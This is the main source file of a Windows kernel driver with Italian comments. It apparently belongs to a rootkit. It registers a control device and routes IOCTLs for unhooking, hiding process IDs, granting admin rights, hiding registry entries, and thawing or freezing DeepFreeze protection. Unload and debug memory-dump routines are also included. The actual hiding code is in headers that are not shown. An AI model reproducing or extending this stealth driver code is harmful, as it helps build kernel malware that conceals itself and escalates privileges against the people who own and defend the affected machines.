#include "ntddk.h"
#include "driver.h"
#include "hiding.h"
#include "deepfreeze.h"
#include "hiding.h"
#include "version.h"
#include "main.h"

// nome del device principale a cui mandare le IOCTL
const WCHAR dev_name[] = NT_CONTROL_DEVICE;
const WCHAR dev_link[] = DOS_CONTROL_DEVICE;

PDEVICE_OBJECT g_driver_device;

NTSTATUS do_ioctl_version(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp)
{
	if (irpSp->Parameters.DeviceIoControl.OutputBufferLength < strlen(DRIVER_VERSION) + 1) {
		Irp->IoStatus.Information = strlen(DRIVER_VERSION);
		Irp->IoStatus.Status = STATUS_BUFFER_OVERFLOW;
		return Irp->IoStatus.Status;
	}

	// reply with the version
	memset(Irp->AssociatedIrp.SystemBuffer, 0, strlen(DRIVER_VERSION) + 1);
	memcpy(Irp->AssociatedIrp.SystemBuffer, DRIVER_VERSION, strlen(DRIVER_VERSION));
	Irp->IoStatus.Information = strlen(DRIVER_VERSION) + 1;
	
	return STATUS_SUCCESS;
}

NTSTATUS DriverDispatchFunc(IN PDEVICE_OBJECT dobj, IN PIRP Irp)
{
	PIO_STACK_LOCATION irpSp;
	NTSTATUS ntstatus = STATUS_SUCCESS;

	// route the IOCTL to the deepfreeze unhook device
	if (dobj != g_driver_device)
		return DispatchDeepFreeze(dobj, Irp);

	irpSp = IoGetCurrentIrpStackLocation (Irp);
	
	Irp->IoStatus.Information = 0;

	if (irpSp->MajorFunction == IRP_MJ_DEVICE_CONTROL) {
		switch (irpSp->Parameters.DeviceIoControl.IoControlCode) {
			/************************************************************************/
			/* HIDING RELATED IOCTL                                                 */
			/************************************************************************/
			case IOCTL_UNHOOK: 
				ntstatus = do_ioctl_unhook(dobj, Irp, irpSp);
				break;
			case IOCTL_ADDPID: 
				ntstatus = do_ioctl_addpid(dobj, Irp, irpSp);
				break;
			case IOCTL_ADMIN: 
				ntstatus = do_ioctl_admin(dobj, Irp, irpSp);
				break;
			case IOCTL_REG: 
				ntstatus = do_ioctl_reg(dobj, Irp, irpSp);
				break;
			/************************************************************************/
			/* DEEPFREEZE RELATED IOCTL                                             */
			/************************************************************************/
			case IOCTL_THAW: 
				ntstatus = do_ioctl_thaw(dobj, Irp, irpSp);
				break;
			case IOCTL_FREEZE: 
				ntstatus = do_ioctl_freeze(dobj, Irp, irpSp);
				break;
			/************************************************************************/
			/* GENERAL PURPOSE                                                      */
			/************************************************************************/
			case IOCTL_VERSION: 
				ntstatus = do_ioctl_version(dobj, Irp, irpSp);
				break;
			default:
				DTRACE("DriverDispatchFunc - Unknown IOCTL code [%.8X]", irpSp->Parameters.DeviceIoControl.IoControlCode);
				break;
		}
	}

	Irp->IoStatus.Status = ntstatus;
	IoCompleteRequest (Irp, IO_NO_INCREMENT);

	return ntstatus;
}


NTSTATUS OnUnload( IN PDRIVER_OBJECT dobj )
{
	UNICODE_STRING	dev_link_unicode;

	OnUnloadHiding(dobj);
	OnUnloadDeepFreeze(dobj);

	RtlInitUnicodeString(&dev_link_unicode, dev_link);

	// Cancella il link che avevamo creato
	IoDeleteSymbolicLink(&dev_link_unicode);
	IoDeleteDevice(g_driver_device);

	DTRACE("OnUnload END");

	return STATUS_SUCCESS;
}


NTSTATUS DriverEntry( IN PDRIVER_OBJECT dobj, IN PUNICODE_STRING regpath)
{
	UNICODE_STRING	dev_name_unicode;
	UNICODE_STRING	dev_link_unicode;
	NTSTATUS nt_status;
	int i;

	DTRACE("DriverEntry called");

	for(i=0; i<=IRP_MJ_MAXIMUM_FUNCTION; i++)
		dobj->MajorFunction[i] = DriverDispatchFunc;

	dobj->DriverUnload = OnUnload;

	// Crea il device per le ioctl
	RtlInitUnicodeString(&dev_name_unicode, dev_name);
	RtlInitUnicodeString(&dev_link_unicode, dev_link);

	nt_status = IoCreateDevice(dobj, 0, &dev_name_unicode, FILE_DEVICE_H4DRIVER, 0, FALSE, &g_driver_device);

	if ( NT_SUCCESS(nt_status) ) 
		nt_status = IoCreateSymbolicLink(&dev_link_unicode, &dev_name_unicode);
	else {
		DTRACE("IoCreateDevice returned [%X]", nt_status);
		return nt_status;
	}
	
	DTRACE("IoCreateSymbolicLink %x", nt_status);

	// call each driverEntry function if the specific parts 
	// have to perform some operation on load
	DriverEntryHiding(dobj, regpath);
	DriverEntryDeepFreeze(dobj, regpath);

	return STATUS_SUCCESS;
}


// Dumps a memory region to debug output
void DumpMemory (void *mem, int size)
{
	unsigned char str[20];
	unsigned char *m = mem;
	int i,j;

	for (j = 0; j < size / 8; j++)
	{
		memset (str,0,sizeof str);
		for (i = 0; i < 8; i++) 
		{
			if (m[i] > ' ' && m[i] <= '~')
				str[i]=m[i];
			else
				str[i]='.';
		}

		DTRACE ("0x%08p  %02x %02x %02x %02x %02x %02x %02x %02x  %s\n",
			m, m[0], m[1], m[2], m[3], m[4], m[5], m[6], m[7], str);

		m+=8;
	}
}